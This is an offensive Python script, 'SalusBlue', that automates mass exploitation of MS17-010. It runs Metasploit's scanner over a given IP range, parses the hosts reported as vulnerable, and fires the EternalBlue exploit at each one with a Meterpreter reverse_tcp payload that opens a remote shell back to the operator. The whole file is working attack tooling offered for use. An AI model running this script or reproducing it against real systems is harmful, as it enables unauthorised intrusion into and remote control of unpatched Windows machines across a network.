#!/usr/bin/python

"""
    SalusBlue
    author: egycondor 
    author: microbot 
    Features:
    -----------------
     - Scan all the network by MSF to identify hosts vulnarable to MS17-010
     - Automatic exploit for hosts	
    -----------------
    TODO:
     * Show anim during scanning
     * Handle errors out from MSF
     * etc
"""
# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

# ############
# LIBRARIES #
#############

from subprocess import Popen, call, PIPE
import subprocess
import re  # RegEx
import os
import sys

#############
def banner():
	print G + subprocess.check_output("banner saluslab",shell = True)
	
def initial_check():
        """
            Ensures required programs are installed.
        """
        apps = ['banner','msfconsole']
        for app in apps:
		if program_exists(app): continue
		else:			
            		print R + ' [!]' + O + ' required program not found: %s' % (R + app + W)
            		print R + ' [!]' + O + ' try: ' + W + 'sudo apt-get install %s or download and compile it manually\n' % app + W 
			exit(0)           

def program_exists(program):
    """
        Uses 'which' (linux command) to check if a program is installed.
    """
    proc = Popen(['which', program], stdout=PIPE, stderr=PIPE)
    txt = proc.communicate()
    if txt[0].strip() == '' and txt[1].strip() == '':
        return False
    if txt[0].strip() != '' and txt[1].strip() == '':
        return True
           
if __name__ == '__main__':
    try:
	if len(sys.argv) != 2:
		print("{} <ip> or CIDR".format(sys.argv[0]))
		sys.exit(1)
	initial_check()
	banner()
	print R + "Please wait for scanning phase" + W
	res = subprocess.check_output("msfconsole -x 'use auxiliary/scanner/smb/smb_ms17_010;set rhosts {};set THREADS 20;run;exit' > out".format(sys.argv[1]),shell = True)
	res = subprocess.check_output("cat out | grep 'Host is likely VULNERABLE' | awk -F ' ' '{print $2}' | awk -F ':' '{print $1}' > vuln",shell = True)
	vulns = open('vuln','r')
	for vuln in vulns.read().split():
		subprocess.check_output("xterm -e msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue;set rhost %s;set payload windows/x64/meterpreter/reverse_tcp;set lhost eth0;exploit'"%vuln,shell = True)
	subprocess.check_output("rm out vuln",shell = True)
    except KeyboardInterrupt:
        print R + '\n (^C)' + O + ' interrupted\n'
